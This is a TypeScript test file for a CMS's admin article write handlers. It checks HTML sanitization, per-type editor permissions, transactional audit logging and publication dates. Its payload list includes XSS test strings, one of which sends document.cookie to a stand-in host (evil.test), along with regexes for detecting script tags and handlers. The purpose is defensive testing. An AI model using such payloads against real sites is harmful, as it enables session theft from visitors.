import assert from 'node:assert/strict'
import test, { mock } from 'node:test'

/**
 * Article bodies are rendered with `v-html` on the public site, so what an editor
 * saves must be neutralised on the way in, and only editors who hold the right
 * permission for the article's TYPE may save at all. The sanitizer and the
 * permission helpers have their own tests; these run the two write handlers and
 * look at what actually reaches the database.
 */

type Row = Record<string, unknown>
const written: { inserts: Array<{ table: string, values: Row }>, updates: Array<{ table: string, set: Row }>, outsideTransaction: string[] } = { inserts: [], updates: [], outsideTransaction: [] }
let existing: Row | null = null

const { articles, activityLogs } = await import('../server/db/schema')
const tableName = (table: unknown) => (table === articles ? 'articles' : table === activityLogs ? 'activity_logs' : 'other')

const tx = {
  insert: (table: unknown) => ({ values: async (values: Row) => { written.inserts.push({ table: tableName(table), values }); return [{ insertId: 4242 }] } }),
  update: (table: unknown) => ({ set: (set: Row) => ({ where: async () => { written.updates.push({ table: tableName(table), set }) } }) }),
}
mock.module('../server/utils/db', {
  namedExports: {
    getDb: () => ({
      // A write on the pool itself commits on its own, whatever transaction block it is
      // written inside: recorded so the tests can insist nothing goes this way.
      insert: (table: unknown) => ({ values: async () => { written.outsideTransaction.push(`insert ${tableName(table)}`); return [{ insertId: 0 }] } }),
      update: (table: unknown) => ({ set: () => ({ where: async () => { written.outsideTransaction.push(`update ${tableName(table)}`) } }) }),
      select: () => ({ from: () => ({ where: () => ({ limit: async () => (existing ? [existing] : []) }) }) }),
      transaction: async (callback: (client: typeof tx) => Promise<unknown>) => callback(tx),
    }),
  },
})
mock.module('../server/services/google-oauth-settings', { namedExports: { defaultCommentsEnabled: async () => false } })

type Event = { body: unknown, params: Record<string, string>, context: { adminUser: unknown } }
const globals = globalThis as unknown as Record<string, unknown>
globals.defineEventHandler = (handler: unknown) => handler
globals.readBody = async (event: Event) => event.body
globals.getRouterParam = (event: Event, name: string) => event.params[name]
globals.createError = (input: { statusCode: number, statusMessage: string }) => Object.assign(new Error(input.statusMessage), input)

const create = (await import('../server/api/admin/articles/index.post')).default as unknown as (event: Event) => Promise<Row>
const update = (await import('../server/api/admin/articles/[id].put')).default as unknown as (event: Event) => Promise<Row>

const grant = (resource: string, ...actions: Array<'Create' | 'Read' | 'Update' | 'Delete'>) => ({
  resource, canCreate: actions.includes('Create'), canRead: true, canUpdate: actions.includes('Update'), canDelete: actions.includes('Delete'),
})
const editor = (permissions: unknown[], isSuperAdmin = false) => ({ id: 9, isSuperAdmin, permissions })
const withEvent = (adminUser: unknown, body: unknown, id = '31'): Event => ({ body, params: { id }, context: { adminUser } })

function reset() { written.inserts.length = 0; written.updates.length = 0; written.outsideTransaction.length = 0; existing = null }
async function statusOf(run: () => Promise<unknown>): Promise<number | null> {
  try { await run(); return null } catch (error) { return (error as { statusCode?: number }).statusCode ?? -1 }
}

const EXECUTABLE = /<\s*(script|object|embed|svg|math|style|form|input|button)\b/i
const HANDLER = /\son[a-z]+\s*=/i
const SCHEME = /(javascript|vbscript|data:text\/html)\s*:/i
const neutral = (html: string) => !EXECUTABLE.test(html) && !HANDLER.test(html) && !SCHEME.test(html)
const PAYLOADS = [
  '<p>ok</p><script>fetch("//evil.test/?c="+document.cookie)</script>',
  '<img src=x onerror="alert(1)">',
  '<a href="javascript:alert(1)">bấm</a>',
  '<svg onload=alert(1)></svg>',
]

// ─── Create ──────────────────────────────────────────────────────────────────

test('create: executable markup never reaches the database', async () => {
  for (const payload of PAYLOADS) {
    reset()
    await create(withEvent(editor([grant('news', 'Create')]), { title: 'Một tiêu đề hợp lệ', content: payload }))
    const stored = written.inserts.find(entry => entry.table === 'articles')!.values.content as string
    assert.ok(neutral(stored), `stored: ${stored}`)
  }
})

test('create: ordinary formatting survives', async () => {
  reset()
  await create(withEvent(editor([grant('news', 'Create')]), { title: 'Một tiêu đề hợp lệ', content: '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong>.</p>' }))
  assert.equal(written.inserts.find(entry => entry.table === 'articles')!.values.content, '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong>.</p>')
})

test('create: the article and its audit row are written inside one transaction', async () => {
  reset()
  const result = await create(withEvent(editor([grant('news', 'Create')]), { title: 'Một tiêu đề hợp lệ' }))
  assert.deepEqual(written.inserts.map(entry => entry.table), ['articles', 'activity_logs'])
  const audit = written.inserts[1]!.values
  assert.equal(audit.userId, 9)
  assert.equal(audit.action, 'create')
  assert.equal(audit.resourceId, 4242)
  assert.equal(result.id, 4242)
  assert.deepEqual(written.outsideTransaction, [], 'nothing is written on the pool outside the transaction')
})

test('create: the permission needed is the one for the article TYPE', async () => {
  const onlyNews = editor([grant('news', 'Create')])
  const cases: Array<[string, number | null]> = [
    ['news', null],
    ['role_model', 403], ['reintegration', 403], ['document', 403], ['faq', 403],
  ]
  for (const [type, expected] of cases) {
    reset()
    assert.equal(await statusOf(() => create(withEvent(onlyNews, { title: 'Một tiêu đề hợp lệ', type }))), expected, type)
    assert.equal(written.inserts.length, expected === null ? 2 : 0, `${type}: a refused request writes nothing`)
  }
  reset()
  const roleModels = editor([grant('role_models', 'Create')])
  assert.equal(await statusOf(() => create(withEvent(roleModels, { title: 'Một tiêu đề hợp lệ', type: 'role_model' }))), null)
})

test('create: an unknown type is checked as `news`, never as something looser', async () => {
  reset()
  const onlyRoleModels = editor([grant('role_models', 'Create')])
  assert.equal(await statusOf(() => create(withEvent(onlyRoleModels, { title: 'Một tiêu đề hợp lệ', type: 'made-up' }))), 403)
  assert.equal(written.inserts.length, 0)
})

test('create: read or update on the resource is not create', async () => {
  reset()
  const readOnly = editor([grant('news', 'Read', 'Update', 'Delete')])
  assert.equal(await statusOf(() => create(withEvent(readOnly, { title: 'Một tiêu đề hợp lệ' }))), 403)
  assert.equal(written.inserts.length, 0)
})

test('create: a too-short title is a 400 and writes nothing', async () => {
  for (const title of ['', '  ', 'ab', undefined]) {
    reset()
    assert.equal(await statusOf(() => create(withEvent(editor([grant('news', 'Create')]), { title }))), 400, JSON.stringify(title))
    assert.equal(written.inserts.length, 0)
  }
})

// ─── Update ──────────────────────────────────────────────────────────────────

test('update: executable markup never reaches the database', async () => {
  for (const payload of PAYLOADS) {
    reset()
    existing = { id: 31, type: 'news', publishedAt: null }
    await update(withEvent(editor([grant('news', 'Update')]), { content: payload }))
    const stored = written.updates.find(entry => entry.table === 'articles')!.set.content as string
    assert.ok(neutral(stored), `stored: ${stored}`)
  }
})

test('update: only the fields in the request are written; no content in the body leaves content alone', async () => {
  reset()
  existing = { id: 31, type: 'news', publishedAt: null }
  await update(withEvent(editor([grant('news', 'Update')]), { title: '  Tiêu đề mới  ' }))
  const set = written.updates.find(entry => entry.table === 'articles')!.set
  assert.deepEqual(Object.keys(set), ['title'])
  assert.equal(set.title, 'Tiêu đề mới')
  assert.equal(written.inserts.find(entry => entry.table === 'activity_logs')!.values.action, 'update')
  assert.deepEqual(written.outsideTransaction, [], 'the update and its audit row are both inside the transaction')
})

test('update: having read or create on the type is not update', async () => {
  reset()
  existing = { id: 31, type: 'news', publishedAt: null }
  const noUpdate = editor([grant('news', 'Create', 'Delete')]) // read is always granted by the helper
  assert.equal(await statusOf(() => update(withEvent(noUpdate, { title: 'Sửa' }))), 403)
  assert.equal(written.updates.length + written.inserts.length, 0)
})

test('update: the permission needed is for the EXISTING type, and a refusal writes nothing', async () => {
  reset()
  existing = { id: 31, type: 'role_model', publishedAt: null }
  const onlyNews = editor([grant('news', 'Update')])
  assert.equal(await statusOf(() => update(withEvent(onlyNews, { title: 'Sửa đổi' }))), 403)
  assert.equal(written.updates.length + written.inserts.length, 0)
})

test('update: moving an article to another type needs permission on the NEW type too', async () => {
  reset()
  existing = { id: 31, type: 'news', publishedAt: null }
  const newsEditor = editor([grant('news', 'Update')])
  assert.equal(await statusOf(() => update(withEvent(newsEditor, { type: 'document' }))), 403, 'cannot smuggle an article into a type they do not manage')
  assert.equal(written.updates.length, 0)
  assert.equal(await statusOf(() => update(withEvent(newsEditor, { type: 'news', title: 'Giữ nguyên thể loại' }))), null, 'staying in the same type needs nothing extra')
  reset()
  existing = { id: 31, type: 'news', publishedAt: null }
  const both = editor([grant('news', 'Update'), grant('documents', 'Update')])
  assert.equal(await statusOf(() => update(withEvent(both, { type: 'document' }))), null)
})

test('update: a missing article is 404 and a bad id is 400', async () => {
  reset()
  existing = null
  assert.equal(await statusOf(() => update(withEvent(editor([grant('news', 'Update')]), { title: 'x' }))), 404)
  for (const id of ['0', 'abc', '']) {
    assert.equal(await statusOf(() => update(withEvent(editor([grant('news', 'Update')]), { title: 'x' }, id))), 400, JSON.stringify(id))
  }
  assert.equal(written.updates.length, 0)
})

test('update: publishing stamps the publication date once', async () => {
  reset()
  existing = { id: 31, type: 'news', publishedAt: null }
  await update(withEvent(editor([grant('news', 'Update')]), { status: 'published' }))
  assert.ok(written.updates[0]!.set.publishedAt instanceof Date)
  reset()
  const earlier = new Date('2026-01-01T00:00:00Z')
  existing = { id: 31, type: 'news', publishedAt: earlier }
  await update(withEvent(editor([grant('news', 'Update')]), { status: 'published' }))
  assert.equal('publishedAt' in written.updates[0]!.set, false, 'republishing does not move the original date')
})

test('super-admin may write any type; a deactivated flag does not', async () => {
  reset()
  existing = { id: 31, type: 'faq', publishedAt: null }
  assert.equal(await statusOf(() => update(withEvent(editor([], true), { title: 'Sửa bởi quản trị' }))), null)
  reset()
  existing = { id: 31, type: 'faq', publishedAt: null }
  assert.equal(await statusOf(() => update(withEvent(editor([], false), { title: 'Sửa' }))), 403)
})
